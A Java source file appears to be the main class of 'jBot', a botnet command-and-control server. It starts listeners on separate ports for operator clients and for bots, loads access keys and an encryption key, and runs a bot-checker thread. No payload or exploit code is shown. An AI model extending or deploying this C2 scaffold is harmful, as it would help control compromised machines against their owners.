package me.aaronakhtar.jbot;

import me.aaronakhtar.jbot.file_manager.ConfigFile;
import me.aaronakhtar.jbot.file_manager.config_files.DefaultConfigurationFile;
import me.aaronakhtar.jbot.file_manager.files.AccessKeysFile;
import me.aaronakhtar.jbot.objects.Bot;
import me.aaronakhtar.jbot.threads.BotCheckerThread;
import me.aaronakhtar.jbot.threads.BotServer;
import me.aaronakhtar.jbot.threads.ClientServer;
import org.reflections.Reflections;

import java.io.File;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class Main {

    static {
        System.out.println(Utilities.Colour.GREEN.get() + "\nDeveloped by Aaron Akhtar \n\n");  // excuse my promo ;P
    }


    public static final Map<String, Object> defaultConfig = ConfigFile.getProperties(new DefaultConfigurationFile());
    public static final List<Bot>        connectedBots = new ArrayList<>();
    public static final List<Socket>        connectedClients = new ArrayList<>();
    public static volatile boolean          isRunning = true;                       //todo create 'switch' to modify this value.
    public static final String              name = "jBot";
    public static final String              encryptionKey = defaultConfig.get("encryption-key").toString();

    public static final Set<Class<? extends ConfigFile>> configFiles = new Reflections("me.aaronakhtar.jbot.file_manager.files")
            .getSubTypesOf(ConfigFile.class);



    public static void main(String[] args) {

        if (args.length != 2){
            Utilities.sendInternalMessage(Utilities.Colour.RED.get() + "Oops! " + Utilities.Colour.RESET.get() + "Please specify the required arguments...");
            System.out.println("'java -jar cnc.jar [cnc-port] [bot-port]'");
            return;
        }
        try {
            final int cncPort = Integer.parseInt(args[0]);
            final int botPort = Integer.parseInt(args[1]);
            for (Class<? extends ConfigFile> configFile : configFiles) {
                try {
                    configFile.newInstance().getFile(); // will create file if it doesn't exist.
                } catch (Exception e) {
                    Utilities.handleException(e);
                }
            }



            Utilities.sendInternalMessage("Fetched ["+AccessKeysFile.getAccessKeys().size()+"] Access-Keys...");

            new ClientServer(cncPort).start();
            new BotServer(botPort).start();

            new BotCheckerThread().start();


            //TODO:
            //  create server
            //  create client handlers

        }catch (Exception e){
            e.printStackTrace();
        }

    }

    public static String getPrefix(){
        return Utilities.Colour.GREEN.get() + "[jBot] " + Utilities.Colour.RESET.get();
    }

}
